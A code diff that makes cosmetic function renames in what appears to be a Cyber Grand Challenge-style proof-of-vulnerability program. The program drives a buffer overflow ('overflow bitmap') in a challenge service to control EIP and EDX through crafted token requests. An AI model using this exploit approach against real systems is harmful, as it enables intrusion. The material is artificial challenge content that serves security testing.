@@ -1,7 +1,7 @@
 /*
  * Copyright (C) Narf Industries <info@narfindustries.com>
  *
- * Permission is hereby granted, __free of charge, to any person obtaining a
+ * Permission is hereby granted, free of charge, to any person obtaining a
  * copy of this software and associated documentation files (the "Software"),
  * to deal in the Software without restriction, including without limitation
  * the rights to use, copy, modify, merge, publish, distribute, sublicense,
@@ -27,7 +27,7 @@
 static char* digits = "0123456789ABCDEF";
 
 void
-__bzero(buf, num)
+bzero(buf, num)
 
 char *buf;				/* buffer to zeroize */
 unsigned int num;		/* the length of the buffer */
@@ -57,7 +57,7 @@ unsigned int num;		/* the number to convert */
 *F*/
 {
 	char tmp[12];
-	__bzero(tmp, 12);
+	bzero(tmp, 12);
 
 	if (num == 0) {
 		buf[0] = '0';
@@ -129,21 +129,21 @@ int main(void) {
     b10_uint(edx_buf, t1vals.regval);
 
 	// getToken with user/pass
-	len = __strlen(getTokenUserPass);
+	len = strlen(getTokenUserPass);
 	if(transmit_all(STDOUT, getTokenUserPass, len))
 		_terminate(1);
 	
 	if(transmit_all(STDOUT, eip_buf, 8))
 		_terminate(1);
 
-	if(transmit_all(STDOUT, "!", __strlen("!")))
+	if(transmit_all(STDOUT, "!", strlen("!")))
 		_terminate(1);			
 
 	if((ret = read_until_delim_or_n(STDIN, token, '?', sizeof(buffer), &bytes)))
 		_terminate(3);
 
-	len1 = __strlen(enrollInvalidToken_str1);
-	len2 = __strlen(enrollInvalidToken_str2);
+	len1 = strlen(enrollInvalidToken_str1);
+	len2 = strlen(enrollInvalidToken_str2);
 	for(int i=1; i<80; i++) {
 
 		if(transmit_all(STDOUT, enrollInvalidToken_str1, len1))
@@ -160,7 +160,7 @@ int main(void) {
 	}
 
 	//overflow bitmap
-	len = __strlen(enrollInvalidTokenPwn_str);
+	len = strlen(enrollInvalidTokenPwn_str);
 	if(transmit_all(STDOUT, enrollInvalidTokenPwn_str, len))
 			_terminate(1);	
 
@@ -171,23 +171,23 @@ int main(void) {
 	if(transmit_all(STDOUT, eip_buf, 8))
 		_terminate(1);
 
-	len = __strlen(pov_str1);
+	len = strlen(pov_str1);
 	if(transmit_all(STDOUT, pov_str1, len))
 		_terminate(1);
 
-	len = __strlen(edx_buf);
+	len = strlen(edx_buf);
 	if(transmit_all(STDOUT, edx_buf, len))
 		_terminate(1);
 
-	len = __strlen(pov_str2);
+	len = strlen(pov_str2);
 	if(transmit_all(STDOUT, pov_str2, len))
 		_terminate(1);
 
-	len = __strlen(token);
+	len = strlen(token);
 	if(transmit_all(STDOUT, token, len))
 		_terminate(1);
 
-	len = __strlen(pov_str3);
+	len = strlen(pov_str3);
 	if(transmit_all(STDOUT, pov_str3, len))
 		_terminate(1);
 
@@ -195,7 +195,7 @@ int main(void) {
 	if((ret = read_until_delim_or_n(STDIN, token, '?', sizeof(token), &bytes)))
 		_terminate(2);
 
-	len = __strlen(getTokenUP_str);
+	len = strlen(getTokenUP_str);
 	if(transmit_all(STDOUT, getTokenUP_str, len))
 		_terminate(1);
 
@@ -205,7 +205,7 @@ int main(void) {
 	if((ret = read_until_delim_or_n(STDIN, token, '?', sizeof(token), &bytes)))
 		_terminate(2);
 
-	len = __strlen(exit_string);
+	len = strlen(exit_string);
 	if(transmit_all(STDOUT, exit_string, len))
 		_terminate(1);
 
